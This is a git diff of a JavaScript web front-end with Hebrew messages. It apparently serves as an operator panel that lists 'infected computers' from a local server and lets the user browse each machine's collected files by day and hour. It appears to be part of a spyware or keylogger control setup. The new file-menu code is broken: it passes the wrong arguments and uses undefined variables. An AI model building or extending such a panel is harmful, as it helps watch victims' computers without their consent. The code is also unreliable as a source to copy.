@@ -36,53 +36,65 @@ function wait(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// שליפת נתוני מחשבים נגועים מהשרת
-async function fetchMachineNamesFromServer(container) {
-    await showMessage("מחברים אותך לשרת... חכה שנייה, אנחנו כמעט שם!", container);
-    await wait(2000);
+
+async function fetchMachines(container) {
     try {
-        const response = await fetch('http://127.0.0.1:5000/get_machine_name');
+        await showMessage("מתחבר לשרת לקבלת נתונים...", container);
+
+        const response = await fetch('http://127.0.0.1:5000/get_machines');
         const data = await response.json();
+        await wait(1000);
+        await showMessage("החיבור לשרת הושלם בהצלחה.", container);
 
-        await showMessage("החיבור לשרת בוצע בהצלחה.", container);
-
-        if (data.names && data.names.length > 0) {
-            await wait(2000); // המתן 4 שניות לפני הצגת הודעה
-            await showMessage("נמצאו מחשבים נגועים. הנתונים יוצגו כעת.", container);
-            createComputersMenu(data.names, container);
-            await wait(2000); // המתן 4 שניות לפני הצגת הודעה
-            await showMessage("אנא בחר מחשב.", container);
-
+        if (data && data.machines.length > 0) {
+        await wait(1000);
+        await showMessage("נמצאו מחשבים נגעוים, מייד מציג את הנתונים.", container);
+            createMachinesMenu(container, data.machines);
+            await showMessage("בחר מחשב מהרשימה:", container);
         } else {
-            await wait(4000); // המתן 4 שניות לפני הצגת הודעה
-            await showMessage("לא נמצאו מחשבים נגועים בשלב זה.", container);
+            await wait(2000);
+            await showMessage("לא נמצאו מחשבים.", container);
         }
     } catch (error) {
-        console.error("Error fetching machine name:", error);
-        await wait(4000); // המתן 4 שניות לפני הצגת הודעה על שגיאה
-        await showMessage("נראה שיש בעיה בהתחברות לשרת. אנא נסה שוב מאוחר יותר.", container);
+        console.error("שגיאה בעת שליפת רשימת מחשבים:", error);
+        await wait(2000);
+        await showMessage("אירעה שגיאה בעת שליפת רשימת מחשבים.", container);
     }
 }
 
-async function fetchDataFromServer(container, machine_names) {
-    await showMessage(`המחשב "${machine_names}" נבחר. מבצע התחברות לשרת...`, container);
+function createMachinesMenu(container, machines) {
+    const menuMachines = document.createElement("div");
+    menuMachines.classList.add("menu-erea", "menu-machines");
+
+    machines.forEach(machine => {
+        const button = document.createElement("button");
+        button.textContent = machine;
+        button.classList.add("menu-button");
+
+        button.onclick = () => fetchDay(container, machine);
+
+        menuMachines.appendChild(button);
+    });
+
+    container.appendChild(menuMachines);
+}
+
+async function fetchDay(container, machineName) {
+    await showMessage(`המחשב "${machineName}" נבחר. מבצע חיפוש נתונים...`, container);
 
     try {
-    const response = await fetch(`http://127.0.0.1:5000/get_day_list/${machine_names}`);
+        const response = await fetch(`http://127.0.0.1:5000/get_day_list/${machineName}`);
         const data = await response.json();
 
-        await wait(2000);
-        await showMessage("החיבור לשרת הושלם בהצלחה.", container);
 
-        if (data && Object.keys(data).length > 0) {
-            await wait(4000);
-            await showMessage(`נתונים עבור המחשב "${machine_names}" נמצאו. מציג את הנתונים כעת...`, container);
-            createFilesMenu(container, data);
-            await wait(2000);
-            await showMessage("איזה נתון תרצה להציג?", container);
+        if (data && data.days.length > 0) {
+            await showMessage(`נתונים עבור המחשב "${machineName}" נמצאו. מציג את הנתונים כעת...`, container);
+            createDayMenu(container, machineName, data.days); // יוצרים תפריט בחירה לנתונים
+            await showMessage("בחר יום להצגת נתונים או הקש F להצגת כל הנתונים", container);
+
         } else {
             await wait(4000);
-            await showMessage(`לא נמצאו נתונים עבור המחשב "${machine_names}".`, container);
+            await showMessage(`לא נמצאו נתונים עבור המחשב "${machineName}".`, container);
         }
     } catch (error) {
         console.error("שגיאה בעת שליפת נתוני המחשב:", error);
@@ -91,54 +103,115 @@ async function fetchDataFromServer(container, machine_names) {
     }
 }
 
-
-function createFilesMenu(container, data) {
-    // יצירת קונטיינר לתפריט הקבצים
+function createDayMenu(container, machineName, days) {
     const menuFiles = document.createElement("div");
-    menuFiles.classList.add("menu-erea", "menu-files");
+    menuFiles.classList.add("menu-erea", "menu-day");
 
-    // יצירת קונטיינר לכפתורים
-    const buttonsContainer = document.createElement("div");
-    buttonsContainer.classList.add("buttons-container");
-
-    // יצירת כפתור לכל יום במערך
-    data.days.forEach(day => {
+    days.forEach(day => {
         const button = document.createElement("button");
         button.textContent = day;
         button.classList.add("menu-button");
 
-        // הגדרת אירוע לחיצה לכל כפתור
-        button.onclick = () => fetchDataFromServer(container, day);
+        button.onclick = () => fetchHour(container, machineName, day);
 
-        // הוספת הכפתור לקונטיינר
-        buttonsContainer.appendChild(button);
+        menuFiles.appendChild(button);
     });
 
-    // הוספת קונטיינר הכפתורים לתפריט
-    menuFiles.appendChild(buttonsContainer);
-    
-    // הוספת תפריט הקבצים לקונטיינר הראשי
     container.appendChild(menuFiles);
 }
+async function fetchHour(container, machineName, selectedDay) {
+    await showMessage(`מבצע שליפת נתונים עבור "${machineName}" ביום "${selectedDay}"...`, container);
 
+    try {
+        const response = await fetch(`http://127.0.0.1:5000/get_hour_list/${machineName}/${selectedDay}`);
+        const data = await response.json();
 
-function createComputersMenu(buttonNames, container) {
-    const buttonsContainer = document.createElement("div");
-    buttonsContainer.classList.add("menu-erea", "menu-computers"); // הוספתי גם את המחלקה "menu-computers"
+        console.log("שעות שהתקבלו מהשרת:", data.hours); // בדיקה
 
-    buttonNames.forEach(name => {
-        const button = document.createElement("button");
-        button.textContent = name;
-        button.classList.add("menu-button");
-
-        button.onclick = () => fetchDataFromServer(container, name);
-
-        buttonsContainer.appendChild(button);
-    });
-
-    container.appendChild(buttonsContainer);
+        if (data && data.hours.length > 0) {
+            await wait(1000);
+            await showMessage(`נתונים עבור המחשב "${machineName}" נמצאו. מציג את הנתונים כעת...`, container);
+            createHourMenu(container, machineName,selectedDay, data.hours); 
+        } else {
+            await wait(4000);
+            await showMessage(`לא נמצאו נתונים עבור המחשב "${machineName}".`, container);
+        }
+    } catch (error) {
+        console.error("שגיאה בעת שליפת נתונים:", error);
+        await showMessage("אירעה תקלה בעת השליפה. אנא נסה שוב מאוחר יותר.", container);
+    }
 }
 
+
+function createHourMenu(container, machineName, selectedDay, hours) {
+    // ניקוי תפריט קודם אם קיים
+    const existingMenu = document.querySelector('.menu-hour');
+    if (existingMenu) {
+        existingMenu.remove();
+    }
+
+    const menuhour = document.createElement("div");
+    menuhour.classList.add("menu-erea", "menu-hour");
+
+    hours.forEach(hour => {
+        const button = document.createElement("button");
+        button.textContent = hour;
+        button.classList.add("menu-button");
+
+        button.onclick = () =>  fetchFile(container, machineName, selectedDay, hour);
+
+        menuhour.appendChild(button);
+    });
+
+    console.log("מוסיף תפריט שעות:", menuhour); // בדיקה
+    container.appendChild(menuhour);
+}
+
+
+async function fetchFile(container, machineName, selectedDay, selecteHour) {
+
+    try {
+        const response = await fetch(`http://127.0.0.1:5000/get_file_list/${machineName}/${selectedDay}/${selecteHour}`);
+        const data = await response.json();
+
+        console.log("שעות שהתקבלו מהשרת:", data.files); // בדיקה
+
+        if (data && data.files.length > 0) {
+            createFileMenu(container, machineName, data.files); 
+        } else {
+            await wait(4000);
+            await showMessage(`לא נמצאו נתונים עבור המחשב "${machineName}".`, container);
+        }
+    } catch (error) {
+        console.error("שגיאה בעת שליפת נתונים:", error);
+        await showMessage("אירעה תקלה בעת השליפה. אנא נסה שוב מאוחר יותר.", container);
+    }
+}
+
+
+function createFileMenu(container, files) {
+    // ניקוי תפריט קודם אם קיים
+    const existingMenu = document.querySelector('.menu-file');
+    if (existingMenu) {
+        existingMenu.remove();
+    }
+
+    const menuFiles = document.createElement("div");
+    menuFiles.classList.add("menu-erea", "menu-hour");
+
+    files.forEach(file => {
+        const button = document.createElement("button");
+        button.textContent = file;
+        button.classList.add("menu-button");
+
+        button.onclick = () => showMessage(`נבחרה שעה: ${hour}`, container);
+
+        menuFiles.appendChild(button);
+    });
+
+    console.log("מוסיף תפריט שעות:", menuhour); // בדיקה
+    container.appendChild(menuhour);
+}
 
 
 // אפקט הקלדה להודעות
@@ -168,7 +241,7 @@ document.addEventListener('DOMContentLoaded', async function() {
     const clock = document.getElementById('clock');
     const messageContainer = document.getElementById('message-container');
     const menuFiles = document.getElementById('menu-files');
-    const menuComputers = document.getElementById('menu-computers');  
+    const menuComputers = document.getElementById('menu-computers');
 
     startClock();
 
@@ -180,7 +253,7 @@ document.addEventListener('DOMContentLoaded', async function() {
     showElements([backgroundVideo, clock, usernameDiv, messageContainer]);
     hideElements([loginMessage]);
 
-    await showMessage(`ברוך הבא, ${username}!`, messageContainer);
+    await showMessage(`ברוך הבא ${username}!`, messageContainer);
     await wait(2000);
-    await fetchMachineNamesFromServer(messageContainer);
+    await fetchMachines(messageContainer);
 });
